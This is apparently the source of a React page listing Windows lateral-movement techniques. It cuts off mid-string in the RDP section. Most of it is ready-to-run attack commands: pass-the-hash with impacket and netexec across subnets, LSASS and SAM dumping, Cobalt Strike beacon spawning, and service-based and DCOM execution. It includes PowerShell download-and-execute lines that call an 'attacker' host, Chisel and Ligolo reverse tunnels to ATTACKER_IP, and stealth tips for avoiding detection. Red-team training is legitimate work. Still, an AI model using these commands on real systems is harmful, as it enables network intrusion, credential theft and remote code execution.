import React from 'react';
import ArchitectureMap from '../components/ArchitectureMap';
import TechniqueCard from '../components/TechniqueCard';

const mapColumns = [
  {
    header: 'AUTHENTICATION',
    color: 'pink',
    nodes: [
      { title: 'Pass the Hash', subtitle: 'Over-PTH • PTH • WMI/SMB', id: 'pth' },
      { title: 'WinRM', subtitle: 'winrs • PS remoting • jump winrm', id: 'winrm' },
      { title: 'RDP Lateral Movement', subtitle: 'RDP • mstsc • hijack • SharpRDP', id: 'rdp-lateral' },
      { title: 'SSH Lateral Movement', subtitle: 'Key reuse • agent hijack • ProxyJump', id: 'ssh-lateral' },
      { title: 'macOS Lateral Movement', subtitle: 'ARD • SSH • osascript • AppleScript', id: 'macos-lateral' },
    ]
  },
  {
    header: 'REMOTE EXECUTION',
    color: 'orange',
    nodes: [
      { title: 'PsExec', subtitle: 'jump psexec • psexec64 • SMB', id: 'psexec' },
      { title: 'WMI', subtitle: 'wmiexec • CoInitializeSecurity', id: 'wmi' },
      { title: 'DCOM', subtitle: 'MMC20 • ShellWindows • lateral', id: 'dcom' },
      { title: 'Scheduled Tasks Remote', subtitle: 'atexec • schtasks • lateral task', id: 'schtasks-lateral' },
    ]
  },
  {
    header: 'NETWORK PIVOTING',
    color: 'blue',
    nodes: [
      { title: 'Pivoting', subtitle: 'SOCKS • reverse port fwd • proxy', id: 'pivoting' },
      { title: 'MSSQL Lateral Movement', subtitle: 'xp_cmdshell • linked servers • UNC auth', id: 'mssql-lateral' },
    ]
  },
];

const techniques = [
  {
    id: 'pth',
    title: 'Pass-the-Hash & Overpass-the-Hash',
    subtitle: 'Authenticate to remote systems using NTLM hashes without the plaintext password',
    tags: ['PTH', 'Overpass-the-Hash', 'impacket', 'netexec', 'Rubeus', 'Cobalt Strike'],
    accentColor: 'pink',
    overview: 'Pass-the-Hash (PTH) authenticates to Windows services using an NTLM hash directly — no plaintext needed. Every impacket tool supports -hashes; netexec automates PTH at scale across entire subnets. Overpass-the-Hash exchanges the NTLM hash for a Kerberos TGT (Rubeus asktgt /rc4), enabling full Kerberos-based lateral movement — useful when NTLM is restricted. On-prem, Cobalt Strike\'s pth command injects the hash into the current beacon session for transparent network auth.',
    steps: [
      'REMOTE PTH: impacket tools all accept -hashes :NTLM_HASH — wmiexec, psexec, smbexec, secretsdump, smbclient',
      'REMOTE PTH at scale: netexec smb subnet -u user -H HASH — test across entire subnets, spray with local admin hash',
      'REMOTE OPSEC: prefer wmiexec/smbexec over psexec — no service creation, less forensic artefacts',
      'ON-PREM PTH: Cobalt Strike pth command injects hash into beacon session → use jump commands to spawn beacons',
      'OVERPASS-THE-HASH: Rubeus asktgt /rc4:NTLM_HASH → TGT injected with /ptt → all subsequent auth is Kerberos-based',
      'PASS-THE-TICKET: inject any .kirbi or ccache ticket with Rubeus ptt — works for any Kerberos-authenticated service',
    ],
    commands: [
      {
        title: 'Remote — impacket & netexec (from Linux)',
        code: `# ── impacket — PTH with all tools ────────────────────────────────────────────
# Hash format: LM:NT — for NTLM-only use :NTLM_HASH (blank LM)
impacket-wmiexec  corp.local/Administrator@TARGET -hashes :NTLM_HASH
impacket-psexec   corp.local/Administrator@TARGET -hashes :NTLM_HASH
impacket-smbexec  corp.local/Administrator@TARGET -hashes :NTLM_HASH
impacket-atexec   corp.local/Administrator@TARGET -hashes :NTLM_HASH "whoami"
impacket-secretsdump corp.local/Administrator@DC01 -hashes :NTLM_HASH -just-dc

# SMB file access with hash
impacket-smbclient corp.local/Administrator@TARGET -hashes :NTLM_HASH
# Then: shares, use C$, get file.txt, put payload.exe

# ── netexec — PTH at scale ────────────────────────────────────────────────────
# Test hash across entire subnet (find where it works)
nxc smb 10.10.10.0/24 -u Administrator -H :NTLM_HASH
nxc smb 10.10.10.0/24 -u Administrator -H :NTLM_HASH --local-auth  # Local admin
nxc winrm 10.10.10.0/24 -u Administrator -H :NTLM_HASH

# Execute commands with PTH
nxc smb TARGET -u Administrator -H :NTLM_HASH -x "whoami"
nxc smb TARGET -u Administrator -H :NTLM_HASH -X "powershell whoami"

# Dump SAM on all hosts where hash is local admin
nxc smb 10.10.10.0/24 -u Administrator -H :NTLM_HASH --local-auth --sam

# Dump LSASS on all accessible hosts
nxc smb 10.10.10.0/24 -u Administrator -H :NTLM_HASH --lsa

# ── Kerberos via PTH from Linux ───────────────────────────────────────────────
# Get a TGT using NTLM hash (Overpass-the-Hash via impacket)
impacket-getTGT corp.local/Administrator -hashes :NTLM_HASH -dc-ip DC01
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass DC01.corp.local`
      },
      {
        title: 'On-Prem — Cobalt Strike PTH + Rubeus OPtH (from beacon)',
        code: `# ── Cobalt Strike PTH ────────────────────────────────────────────────────────
# Inject hash into beacon session for transparent NTLM auth
pth CORP\\Administrator aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>
# Full format: pth DOMAIN\\user LM_HASH:NT_HASH
# Shorthand (NTLM only — blank LM):
pth CORP\\Administrator :<NTLM_HASH>

# Now authenticate to remote resources as that user
shell dir \\TARGET\C$                      # SMB share access
shell net use \\TARGET\C$ /user:CORP\Administrator

# Spawn beacons on remote hosts using the injected hash
jump psexec64   TARGET HTTPS-Listener      # via PsExec (SYSTEM)
jump winrm64    TARGET HTTPS-Listener      # via WinRM
jump wmi        TARGET HTTPS-Listener      # via WMI

rev2self                                   # Revert token when done

# ── Overpass-the-Hash (Rubeus) — hash → Kerberos TGT ─────────────────────────
# Request TGT using NTLM hash — inject into current session
execute-assembly /tools/Rubeus.exe asktgt \
  /user:Administrator \
  /rc4:<NTLM_HASH> \
  /domain:corp.local \
  /ptt /nowrap
# Now using Kerberos — no NTLM traffic generated

# With AES256 (much stealthier — no RC4 downgrade events)
execute-assembly /tools/Rubeus.exe asktgt \
  /user:Administrator \
  /aes256:<AES256_KEY> \
  /domain:corp.local \
  /opsec /ptt /nowrap

# ── Pass-the-Ticket (inject existing ticket) ─────────────────────────────────
execute-assembly /tools/Rubeus.exe ptt /ticket:<BASE64_KIRBI>
execute-assembly /tools/Rubeus.exe klist           # Verify injected tickets
execute-assembly /tools/Rubeus.exe triage          # List all tickets in all sessions`
      }
    ]
  },
  {
    id: 'winrm',
    title: 'Windows Remote Management (WinRM)',
    subtitle: 'Lateral movement via WinRM/PSRemoting to hosts where it is enabled',
    tags: ['WinRM', 'PSRemoting', 'winrs', 'Evil-WinRM', 'netexec', 'Cobalt Strike'],
    accentColor: 'pink',
    overview: 'WinRM is Microsoft\'s WS-Management implementation — enabled by default on Windows Server and DCs (port 5985 HTTP, 5986 HTTPS). Requires membership in local Administrators or WinRMRemoteWMIUsers__. Evil-WinRM provides an interactive Linux shell with PTH, file transfer, and in-memory .NET/PowerShell loading. Netexec winrm validates access at scale. Cobalt Strike\'s jump winrm64 deploys a beacon entirely via WinRM without dropping to a predictable disk path.',
    steps: [
      'ENUMERATE (remote): netexec winrm subnet -u user -H hash — confirms WinRM access across all reachable hosts',
      'ACCESS (remote): evil-winrm -i TARGET -u user -H NTLM_HASH — full interactive shell with PTH, upload/download, .NET loading',
      'ACCESS (remote): impacket-wmiexec or netexec winrm -x for one-shot command execution from Linux',
      'ACCESS (on-prem): winrs -r:TARGET cmd — lightweight WinRM client built into Windows, works with make_token',
      'ACCESS (on-prem): Invoke-Command / Enter-PSSession — PowerShell remoting over WinRM',
      'BEACON (on-prem): Cobalt Strike make_token then jump winrm64 TARGET Listener — drops beacon via WinRM',
    ],
    commands: [
      {
        title: 'Remote — Evil-WinRM & netexec (from Linux)',
        code: `# ── netexec — enumerate WinRM access across subnet ───────────────────────────
nxc winrm 10.10.10.0/24 -u Administrator -p Password
nxc winrm 10.10.10.0/24 -u Administrator -H :NTLM_HASH
nxc winrm 10.10.10.0/24 -u Administrator -H :NTLM_HASH --local-auth

# Execute command on all accessible WinRM hosts
nxc winrm 10.10.10.0/24 -u Administrator -H :NTLM_HASH -x "whoami /all"
nxc winrm TARGET -u Administrator -H :NTLM_HASH -X "Get-Process"  # PowerShell

# ── Evil-WinRM — interactive shell with PTH ───────────────────────────────────
# Password auth
evil-winrm -i TARGET -u Administrator -p Password123

# Pass-the-Hash
evil-winrm -i TARGET -u Administrator -H NTLM_HASH

# Kerberos (pass-the-ticket)
export KRB5CCNAME=Administrator.ccache
evil-winrm -i TARGET -r corp.local   # -r = realm for Kerberos

# Upload tools / download loot
evil-winrm> upload /opt/tools/SharpHound.exe C:\\Windows\\Temp\\sh.exe
evil-winrm> download C:\\Windows\\Temp\\results.zip /tmp/results.zip

# Load .NET assembly in memory (no disk touch)
evil-winrm> Invoke-Binary /opt/tools/Rubeus.exe "klist"

# ── impacket for WinRM-style exec ─────────────────────────────────────────────
# wmiexec uses WMI over DCOM (port 135+), not WinRM, but similar effect:
impacket-wmiexec corp.local/Administrator@TARGET -hashes :NTLM_HASH`
      },
      {
        title: 'On-Prem — winrs, PSRemoting & CS jump (from beacon)',
        code: `# ── winrs — built-in WinRM client ────────────────────────────────────────────
winrs -r:TARGET whoami
winrs -r:TARGET cmd                    # Interactive CMD session
winrs -r:TARGET -u:CORP\\user -p:Pass cmd  # With explicit creds

# ── PowerShell Remoting ───────────────────────────────────────────────────────
# Interactive session
$cred = New-Object PSCredential("CORP\Administrator", (ConvertTo-SecureString "Pass" -AsPlainText -Force))
Enter-PSSession -ComputerName TARGET -Credential $cred

# One-shot command execution
Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { whoami; hostname; ipconfig }

# Load and run script remotely (in-memory on target)
Invoke-Command -ComputerName TARGET -Credential $cred \
  -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://attacker/tool.ps1') }

# Multi-hop remoting (double-hop workaround)
Invoke-Command -ComputerName HOP1 -Credential $cred -ScriptBlock {
  Invoke-Command -ComputerName HOP2 -ScriptBlock { whoami }
}

# ── Cobalt Strike — jump via WinRM ────────────────────────────────────────────
# Method 1: make_token then jump
make_token CORP\\Administrator Password123
jump winrm64 TARGET HTTPS-Listener    # Beacon spawned via WinRM (64-bit)
rev2self

# Method 2: PTH then jump
pth CORP\\Administrator :<NTLM_HASH>
jump winrm64 TARGET HTTPS-Listener
rev2self`
      }
    ]
  },
  {
    id: 'psexec',
    title: 'PsExec — Service-Based Lateral Movement',
    subtitle: 'Create a temporary service on the remote host to execute commands as SYSTEM',
    tags: ['PsExec', 'smbexec', 'SMB', 'ADMIN$', 'impacket', 'netexec', 'Cobalt Strike'],
    accentColor: 'orange',
    overview: 'PsExec copies a payload to ADMIN$, creates a Windows service, starts it (as SYSTEM), then cleans up. Classic Sysinternals PsExec is heavily signatured — use impacket-psexec or Cobalt Strike jump psexec64 instead. Impacket-smbexec is stealthier: it avoids writing a binary to disk by running each command via cmd.exe through a service, reading output from a temp file on C$. Netexec smb --exec-method smbexec runs commands at scale across a subnet with PTH.',
    steps: [
      'REMOTE (impacket-psexec): copies a service binary to ADMIN$, creates/starts service as SYSTEM — noisier, binary on disk',
      'REMOTE (impacket-smbexec): no binary dropped — each command runs via cmd.exe through a service; output read from C$\\Windows\\Temp',
      'REMOTE (netexec): nxc smb -x "cmd" --exec-method smbexec — automates smbexec across subnets with PTH',
      'ON-PREM (CS jump psexec64): randomised service + binary name, runs as SYSTEM, auto-cleans up after beacon connects back',
      'ON-PREM (CS jump psexec_psh): PowerShell-based — no binary written to ADMIN$, runs via encoded PS command in service',
      'OPSEC: all PsExec variants create a Windows service (EventID 7045) and SMB access to ADMIN$ — detectable; prefer WMI/WinRM where possible',
    ],
    commands: [
      {
        title: 'Remote — impacket & netexec (from Linux)',
        code: `# ── impacket-psexec — binary on ADMIN$, runs as SYSTEM ───────────────────────
impacket-psexec corp.local/Administrator:Password@TARGET
impacket-psexec corp.local/Administrator@TARGET -hashes :NTLM_HASH

# Kerberos (pass-the-ticket)
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass TARGET.corp.local

# ── impacket-smbexec — no binary on disk (stealthier) ────────────────────────
impacket-smbexec corp.local/Administrator:Password@TARGET
impacket-smbexec corp.local/Administrator@TARGET -hashes :NTLM_HASH
# Each command: cmd.exe /Q /c <cmd> 1> C:\\Windows\\Temp\\xxxx 2>&1; output read via SMB

# ── impacket-atexec — scheduled task execution ───────────────────────────────
# Uses Task Scheduler instead of services — different event ID (4698 vs 7045)
impacket-atexec corp.local/Administrator@TARGET -hashes :NTLM_HASH "whoami"

# ── netexec — exec at scale ───────────────────────────────────────────────────
# smbexec method (no binary on disk)
nxc smb 10.10.10.0/24 -u Administrator -H :NTLM_HASH -x "whoami" --exec-method smbexec
nxc smb 10.10.10.0/24 -u Administrator -H :NTLM_HASH --local-auth -x "whoami" --exec-method smbexec

# wmiexec method (uses WMI — different artefacts)
nxc smb TARGET -u Administrator -H :NTLM_HASH -x "whoami" --exec-method wmiexec

# Drop and execute file
nxc smb TARGET -u Administrator -H :NTLM_HASH --put-file /tmp/beacon.exe C:\\Windows\\Temp\\b.exe
nxc smb TARGET -u Administrator -H :NTLM_HASH -x "C:\\Windows\\Temp\\b.exe"`
      },
      {
        title: 'On-Prem — Cobalt Strike jump psexec (from beacon)',
        code: `# ── CS jump commands — spawn beacon via SMB ──────────────────────────────────
# Requires valid creds/token first

# Method 1: make_token (plaintext creds)
make_token CORP\\Administrator Password123
jump psexec64   TARGET HTTPS-Listener   # 64-bit — copies beacon.exe to ADMIN$, runs as SYSTEM
jump psexec_psh TARGET HTTPS-Listener   # PowerShell service — no binary on ADMIN$
jump psexec     TARGET HTTPS-Listener   # 32-bit
rev2self

# Method 2: PTH (hash-based)
pth CORP\\Administrator :<NTLM_HASH>
jump psexec64 TARGET HTTPS-Listener
rev2self

# Method 3: Steal token from existing process
steal_token <PID>
jump psexec64 TARGET HTTPS-Listener
rev2self

# ── Manual service-based execution (when jump isn't available) ────────────────
# Copy payload to ADMIN$
shell copy beacon.exe \\TARGET\ADMIN$\svc_update.exe
# Create + start service
shell sc \\TARGET create svc_update binPath= "C:\Windows\svc_update.exe" start= demand
shell sc \\TARGET start  svc_update
# Cleanup after beacon connects
shell sc \\TARGET delete svc_update
shell del \\TARGET\ADMIN$\svc_update.exe`
      }
    ]
  },
  {
    id: 'wmi',
    title: 'WMI — Windows Management Instrumentation',
    subtitle: 'Execute commands on remote hosts via WMI without leaving files on disk',
    tags: ['WMI', 'wmiexec', 'Win32_Process', 'SharpWMI', 'netexec', 'CoInitializeSecurity', 'fileless'],
    accentColor: 'orange',
    overview: 'WMI enables remote process creation via Win32_Process.Create — no files dropped to disk, the command runs via the WMI service. Impacket-wmiexec provides a semi-interactive shell by reading output from a temp file on C$; the -nooutput flag skips the C$ write for stealth. The critical Cobalt Strike OPSEC note: jump wmi calls CoInitializeSecurity which can corrupt the beacon\'s COM state — use SharpWMI via execute-assembly instead. Netexec supports wmiexec method for bulk execution.',
    steps: [
      'REMOTE (impacket-wmiexec): semi-interactive shell — each command via Win32_Process.Create, output via C$\\Windows\\Temp file',
      'REMOTE (netexec --exec-method wmiexec): single command execution via WMI across subnet with PTH',
      'REMOTE STEALTH: wmiexec -nooutput — runs command but no C$ output file; useful for fire-and-forget payloads',
      'ON-PREM (CS jump wmi): spawns beacon via WMI; CoInitializeSecurity side-effect can break COM in beacon process',
      'ON-PREM (SharpWMI): execute-assembly avoids CoInitializeSecurity issue — preferred over jump wmi for stability',
      'ON-PREM (PowerShell Invoke-WmiMethod): works from any WinRM/beacon session — no separate tool needed',
      'EVENTS: Win32_Process creation logged as EventID 4688 + WMI Activity/Operational log — script block logging captures PS calls',
    ],
    commands: [
      {
        title: 'Remote — impacket-wmiexec & netexec (from Linux)',
        code: `# ── impacket-wmiexec — semi-interactive shell ────────────────────────────────
impacket-wmiexec corp.local/Administrator:Password@TARGET
impacket-wmiexec corp.local/Administrator@TARGET -hashes :NTLM_HASH

# Kerberos (pass-the-ticket)
export KRB5CCNAME=Administrator.ccache
impacket-wmiexec -k -no-pass TARGET.corp.local

# No output mode (stealth — no C$ read-back)
impacket-wmiexec corp.local/Administrator@TARGET -hashes :NTLM_HASH \
  -nooutput "powershell -nop -w hidden -ep bypass -c IEX((New-Object Net.WebClient).DownloadString('http://attacker/s.ps1'))"

# ── netexec — WMI execution at scale ─────────────────────────────────────────
nxc smb TARGET -u Administrator -H :NTLM_HASH -x "whoami" --exec-method wmiexec
nxc smb 10.10.10.0/24 -u Administrator -H :NTLM_HASH --local-auth -x "whoami" --exec-method wmiexec

# ── Direct Win32_Process via Python (no impacket shell) ──────────────────────
python3 -c "
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dcomrt import DCOMConnection
dcom = DCOMConnection('TARGET', 'Administrator', 'Password', 'corp.local')
iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', None, None)
win32Process, _ = iWbemServices.GetObject('Win32_Process')
win32Process.Create('calc.exe', 'C:\\\\Windows\\\\System32', None)
"`
      },
      {
        title: 'On-Prem — SharpWMI & CS jump wmi (from beacon)',
        code: `# ── SharpWMI via execute-assembly (preferred — avoids CoInitializeSecurity) ──
execute-assembly /tools/SharpWMI.exe action=exec computername=TARGET command="C:\\Windows\\Temp\\beacon.exe"
execute-assembly /tools/SharpWMI.exe action=exec computername=TARGET \
  command="powershell -nop -w hidden -ep bypass -enc <BASE64_CMD>"

# Query WMI remotely (enumeration)
execute-assembly /tools/SharpWMI.exe action=query computername=TARGET \
  query="SELECT * FROM Win32_Process WHERE Name='lsass.exe'"

# ── Cobalt Strike jump wmi (CoInitializeSecurity note) ───────────────────────
# WARNING: jump wmi calls CoInitializeSecurity — may corrupt COM state in beacon
# Use only if beacon is expendable, or use SharpWMI above instead
make_token CORP\\Administrator Password123
jump wmi TARGET HTTPS-Listener
rev2self

# ── PowerShell WMI exec (from any remote session) ─────────────────────────────
$cred = New-Object PSCredential("CORP\Administrator", (ConvertTo-SecureString "Pass" -AsPlainText -Force))

# Create process via Win32_Process
Invoke-WmiMethod \
  -ComputerName TARGET \
  -Class Win32_Process \
  -Name Create \
  -ArgumentList "C:\\Windows\\Temp\\beacon.exe" \
  -Credential $cred

# CIM cmdlets (newer, same underlying mechanism)
Invoke-CimMethod \
  -ComputerName TARGET \
  -ClassName Win32_Process \
  -MethodName Create \
  -Arguments @{CommandLine = "calc.exe"} \
  -Credential $cred`
      }
    ]
  },
  {
    id: 'dcom',
    title: 'DCOM — Distributed COM Lateral Movement',
    subtitle: 'Use DCOM application interfaces to execute code on remote systems',
    tags: ['DCOM', 'MMC20', 'ShellWindows', 'impacket dcomexec', 'netexec', 'Cobalt Strike'],
    accentColor: 'orange',
    overview: 'DCOM allows remote instantiation of COM objects over RPC (port 135). MMC20.Application\'s ExecuteShellCommand and ShellWindows/ShellBrowserWindow\'s ShellExecute create child processes of mmc.exe or explorer.exe — less suspicious than service creation (PsExec). Impacket-dcomexec supports MMC20, ShellWindows, and ShellBrowserWindow objects from Linux with PTH. Netexec supports dcomexec exec-method for bulk use. Cobalt Strike jump dcom automates the chain on-prem.',
    steps: [
      'REMOTE (impacket-dcomexec): specify -object MMC20, ShellWindows, or ShellBrowserWindow — supports PTH from Linux',
      'REMOTE (netexec --exec-method dcomexec): bulk DCOM execution across subnet with PTH',
      'ON-PREM (PowerShell): instantiate COM object remotely via [activator]::CreateInstance with target hostname — requires creds/token',
      'ON-PREM (CS jump dcom): automates MMC20.Application — make_token first, then jump, then rev2self',
      'PARENT PROCESS: MMC20 → child of mmc.exe; ShellWindows → child of explorer.exe — blend in with legitimate processes',
      'OPSEC: DCOM creates EventID 4688 (process creation) + DCOM activation event 10016 if permissions denied — less noisy than service events',
    ],
    commands: [
      {
        title: 'Remote — impacket-dcomexec & netexec (from Linux)',
        code: `# ── impacket-dcomexec — fire a command via DCOM from Linux ──────────────────
# MMC20.Application (most common)
impacket-dcomexec -object MMC20 corp.local/Administrator:Password@TARGET 'C:\\Windows\\Temp\\beacon.exe'
impacket-dcomexec -object MMC20 corp.local/Administrator@TARGET 'C:\\Windows\\Temp\\b.exe' -hashes :NTLM_HASH

# ShellWindows (child of explorer.exe — blends in)
impacket-dcomexec -object ShellWindows corp.local/Administrator:Password@TARGET 'cmd.exe /c whoami > C:\\out.txt'
impacket-dcomexec -object ShellWindows corp.local/Administrator@TARGET 'calc.exe' -hashes :NTLM_HASH

# ShellBrowserWindow
impacket-dcomexec -object ShellBrowserWindow corp.local/Administrator:Password@TARGET 'C:\\b.exe'

# No output (stealth)
impacket-dcomexec -object MMC20 corp.local/Administrator@TARGET \
  'powershell -nop -w hidden -enc <BASE64>' -hashes :NTLM_HASH -nooutput

# Kerberos
export KRB5CCNAME=Administrator.ccache
impacket-dcomexec -object MMC20 -k -no-pass TARGET.corp.local 'C:\\b.exe'

# ── netexec — DCOM at scale ───────────────────────────────────────────────────
nxc smb TARGET -u Administrator -H :NTLM_HASH -x "whoami" --exec-method dcomexec
nxc smb 10.10.10.0/24 -u Administrator -H :NTLM_HASH --local-auth -x "whoami" --exec-method dcomexec`
      },
      {
        title: 'On-Prem — PowerShell DCOM & CS jump dcom (from beacon)',
        code: `# ── MMC20.Application — most reliable DCOM lateral movement ──────────────────
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "TARGET"))
$com.Document.ActiveView.ExecuteShellCommand("C:\\Windows\\Temp\\beacon.exe", $null, $null, "7")
# Process runs as child of mmc.exe

# ── ShellWindows — child of explorer.exe (stealthier parent) ─────────────────
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39", "TARGET"))
$item = $com.Item()
$item.Document.Application.ShellExecute("C:\\Windows\\Temp\\beacon.exe", $null, "C:\\Windows\\System32", $null, 0)

# ── ShellBrowserWindow ────────────────────────────────────────────────────────
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "TARGET"))
$com.Document.Application.ShellExecute("cmd.exe", "/c C:\\Windows\\Temp\\b.exe", "C:\\Windows\\Temp", $null, 0)

# ── Cobalt Strike jump dcom ───────────────────────────────────────────────────
make_token CORP\\Administrator Password123
jump dcom TARGET HTTPS-Listener   # Uses MMC20.Application — spawns beacon as child of mmc.exe
rev2self

# PTH then jump dcom
pth CORP\\Administrator :<NTLM_HASH>
jump dcom TARGET HTTPS-Listener
rev2self`
      }
    ]
  },
  {
    id: 'pivoting',
    title: 'Pivoting — Reaching Segmented Networks',
    subtitle: 'Route traffic through compromised hosts to access isolated network segments',
    tags: ['SOCKS', 'Proxychains', 'Ligolo-ng', 'Chisel', 'Sliver', 'port forward', 'Proxifier', 'Kerberos pivoting'],
    accentColor: 'blue',
    overview: 'Pivoting routes attacker traffic through a compromised host to reach network segments that are not directly accessible. Cobalt Strike\'s SOCKS proxy opens a SOCKS5 listener on the team server that routes through the Beacon. Ligolo-ng creates a real TUN interface — tools run without Proxychains as if directly on the internal network. Chisel provides HTTP-based tunneling that passes through web proxies and restrictive firewalls. Each technique has different performance, detectability, and traffic fingerprint characteristics.',
    steps: [
      'Pivoting: use a compromised host as a relay to reach networks not directly accessible from the internet',
      'Cobalt Strike SOCKS proxy: beacon opens a SOCKS5 listener on team server — route all proxy traffic through beacon',
      'Ligolo-ng: TUN-based tunneling — creates a real network interface, no need for Proxychains (transparent routing)',
      'Chisel: HTTP-based TCP/SOCKS tunnel — works through firewalls; run server on attacker, client on victim',
      'Sliver pivoting: built-in `socks5` command plus TCP/named-pipe pivot listeners for chaining sessions',
      'Proxychains (Linux) / Proxifier (Windows): route tool traffic through any SOCKS5 proxy',
      'Reverse port forward: forward a port on the beacon host back to team server — expose internal services',
      'Kerberos pivoting: set KRB5CCNAME and route auth through the SOCKS proxy for domain operations',
    ],
    commands: [
      {
        title: 'Cobalt Strike — SOCKS proxy & port forwarding',
        code: `# Open SOCKS5 proxy on team server via beacon
socks 1080          # Beacon relays traffic from teamserver:1080 to internal net
socks stop          # Stop SOCKS proxy

# Proxychains (/etc/proxychains4.conf)
[ProxyList]
socks5 127.0.0.1 1080

# Route tools through proxy
proxychains nmap -sT -Pn -p 80,443,445 10.10.10.0/24
proxychains impacket-wmiexec corp.local/Administrator:Pass@10.10.10.5
proxychains evil-winrm -i 10.10.10.10 -u Administrator -H NTLM_HASH
proxychains crackmapexec smb 10.10.10.0/24

# Reverse port forward (expose internal service to team server)
rportfwd 8080 127.0.0.1 80   # beacon:8080 → teamserver:80

# Kerberos through proxy
KRB5CCNAME=/tmp/ticket.ccache proxychains impacket-psexec -k -no-pass DC01.corp.local`
      },
      {
        title: 'Ligolo-ng — transparent TUN-based pivoting',
        code: `# Ligolo-ng: creates a real tun interface — no Proxychains needed
# Attacker: run the proxy (server)
./proxy -selfcert -laddr 0.0.0.0:11601

# Victim: run the agent (upload and execute)
.\agent.exe -connect ATTACKER_IP:11601 -ignore-cert

# In Ligolo-ng proxy console:
ligolo-ng » session               # List connected agents
ligolo-ng » [0] » ifconfig        # Enumerate victim network interfaces
ligolo-ng » [0] » start           # Activate tunnel

# Add route on attacker to send traffic through tun0
sudo ip route add 10.10.10.0/24 dev ligolo   # Linux
# Windows: route add 10.10.10.0 mask 255.255.255.0 <tun_IP>

# Now interact directly — no proxychains needed!
nmap -sV 10.10.10.0/24
impacket-secretsdump corp.local/Administrator:Pass@10.10.10.5
evil-winrm -i 10.10.10.10 -u Administrator -H NTLM_HASH

# Pivot through second hop (nested pivot)
ligolo-ng » [0] » listener_add --addr 0.0.0.0:1080 --to 127.0.0.1:1080
# Run agent on second hop connecting back through first`
      },
      {
        title: 'Chisel — HTTP/HTTPS TCP tunnel',
        code: `# Chisel: HTTP-based tunnel — works through web proxies and restrictive firewalls
# Attacker: start reverse server
./chisel server --reverse --port 8080

# Victim: connect back and expose SOCKS5
.\chisel.exe client ATTACKER_IP:8080 R:socks
# Creates SOCKS5 on attacker 127.0.0.1:1080

# Victim: expose a specific internal port
.\chisel.exe client ATTACKER_IP:8080 R:3389:10.10.10.5:3389
# Attacker can now RDP to 127.0.0.1:3389 → 10.10.10.5:3389

# Multi-hop: forward another Chisel server through the tunnel
# (victim A → attacker, victim B → victim A's listener)
proxychains ./chisel client 10.10.10.5:9090 R:socks

# Chisel with TLS (evade inspection)
./chisel server --reverse --port 443 --tls-cert cert.pem --tls-key key.pem
.\chisel.exe client --tls-skip-verify ATTACKER_IP:443 R:socks`
      },
      {
        title: 'Sliver — built-in pivoting',
        code: `# Sliver has native pivot support via TCP listeners on an active session

# Create a TCP pivot listener on the compromised host
sliver [session-A] > pivots tcp --lport 9001
# session-A now listens on :9001 — implants connecting here relay through it

# Generate a pivot implant that connects to session-A's pivot listener
sliver > generate --os windows --tcp-pivot SESSION_A_IP:9001 --name pivot-b

# Drop and execute pivot-b on the second hop — it connects back through session-A
# session-B appears in Sliver console routed via session-A

# SOCKS5 proxy via Sliver session
sliver [session-A] > socks5 start --host 127.0.0.1 --port 1080
# Team server now has SOCKS5 on 127.0.0.1:1080 routed through session-A

# Reverse port forward
sliver [session-A] > portfwd add --remote 10.10.10.5:445 --local 127.0.0.1:4445
# Connect to localhost:4445 on team server → routes to 10.10.10.5:445 through implant`
      }
    ]
  },
  {
    id: 'rdp-lateral',
    title: 'RDP Lateral Movement & Session Hijacking',
    subtitle: 'Move laterally via RDP with stolen credentials, hashes, or by hijacking existing disconnected sessions',
    tags: ['RDP', 'mstsc', 'SharpRDP', 'RDP session hijack', 'tscon', 'xfreerdp', 'RestrictedAdmin', 'Kerberos RDP'],
    accentColor: 'pink',
    overview: `RDP (Remote Desktop Protocol) lateral movement has evolved beyond simple credential-based access. Key techniques:

1. PASS-THE-HASH via Restricted Admin Mode: if target has RestrictedAdmin enabled (HKLM reg key), connect with PTH using mstsc /restrictedadmin or xfreerdp with -pth flag
2. SESSION HIJACKING (tscon): attach to a disconnected RDP session without knowing the user's password — requires only SYSTEM on the target host; the session is reconnected to your session
3. SharpRDP: execute commands on a remote host via RDP protocol without opening a GUI — useful when other remote execution is blocked but RDP (3389) is open
4. BlueKeep / DejaBlue: unauthenticated RDP exploits (CVE-2019-0708, CVE-2019-1182) — legacy Windows only

Session hijacking via tscon is particularly stealthy — no new process creation, no logon event (the session already exists).`,
    steps: [
      'Check RestrictedAdmin mode on target: reg query HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin',
      'Enable RestrictedAdmin if DA: reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0',
      'PTH via RDP (xfreerdp): xfreerdp /v:TARGET /u:Administrator /pth:NTLM_HASH /cert:ignore',
      'List RDP sessions on target: query session /server:TARGET',
      'Hijack disconnected session: tscon SESSION_ID /dest:rdp-tcp#N — no password needed, requires SYSTEM',
      'SharpRDP: execute commands silently via RDP protocol (no interactive GUI session)',
    ],
    commands: [
      {
        title: 'RDP lateral movement — xfreerdp, SharpRDP, session hijack',
        code: `# --- PASS-THE-HASH VIA RDP (Restricted Admin Mode) ---
# Step 1: Check if Restricted Admin is enabled on target
reg query \\\\TARGET\\HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin
# Value = 0 means Restricted Admin IS enabled (confusingly named)

# Enable it remotely (if you have admin rights):
shell reg add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f

# Step 2: PTH via xfreerdp (Linux)
xfreerdp /v:TARGET /u:Administrator /pth:NTLM_HASH /cert:ignore
